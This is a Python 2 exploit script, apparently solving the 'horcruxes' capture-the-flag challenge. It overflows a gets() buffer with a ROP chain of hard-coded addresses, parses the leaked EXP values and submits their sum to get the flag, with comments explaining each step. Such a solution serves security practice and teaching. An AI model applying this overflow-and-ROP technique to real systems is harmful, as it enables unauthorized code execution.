import struct
import socket
import re

conn = socket.socket()
conn.connect(("0.0.0.0", 9032))

'''
welcome message:
"Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!"
'''
conn.recv(1024)

# selecting menu 1 = not important
conn.send("1\n")

'''
choosing menu:
"Select Menu:"
'''
conn.recv(1024)


function_A = 0x809FE4B
function_B = 0x809FE6A
function_C = 0x809FE89
function_D = 0x809FEA8
function_E = 0x809FEC7
function_F = 0x809FEE6
function_G = 0x809FF05
function_ropme = 0x809FFF9

'''
The actual exploit

the commercial code uses the function gets - which is not safe.
this code is a ROP designed to go through every function in order to get all the exp needed for the final input - 
thus making it possible to match the sum of those random numbers.

NOTE: we cannot jump straight to the flag section because the function is at "0x80A010B" - 0x0a cannot be processes as a byte in the input. :(

after the flags we ROP into the main function "ropme" - in order to insert the total value we got and get the flag
'''
conn.send('\x41'*120 + struct.pack('<IIIIIIII', function_A, function_B, function_C, function_D, function_E, function_F, function_G, function_ropme) + "\n")


conn.recv(1024)
response_with_exp = conn.recv(1024)

'''
Exploit output

"You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +559993543)
You found "Marvolo Gaunt's Ring" (EXP +270714552)
You found "Helga Hufflepuff's Cup" (EXP +1486356403)
You found "Salazar Slytherin's Locket" (EXP +2060703066)
You found "Rowena Ravenclaw's Diadem" (EXP +-1520994850)
You found "Nagini the Snake" (EXP +-1579079153)
You found "Harry Potter" (EXP +500523115)"

'''
print response_with_exp

'''
finding every exp from horcruxes using regex search
'''
exp_per_horcrox = re.findall(r"EXP \+(-*\d+)", response_with_exp)
print "exp gained per horcruxes: {}".format(exp_per_horcrox)

'''
Get the total value of EXP
'''
total_exp_gainer = sum([int(i) for i in exp_per_horcrox])
print "Total exp gained: {}".format(total_exp_gainer)

# selecting a menu
conn.send("1\n")

# recieve "How many EXP did you earned? :"
conn.recv(1024)

# sending the total number
print conn.send("{}\n".format(str(total_exp_gainer )))

# recieving the flag :)
print conn.recv(1024)
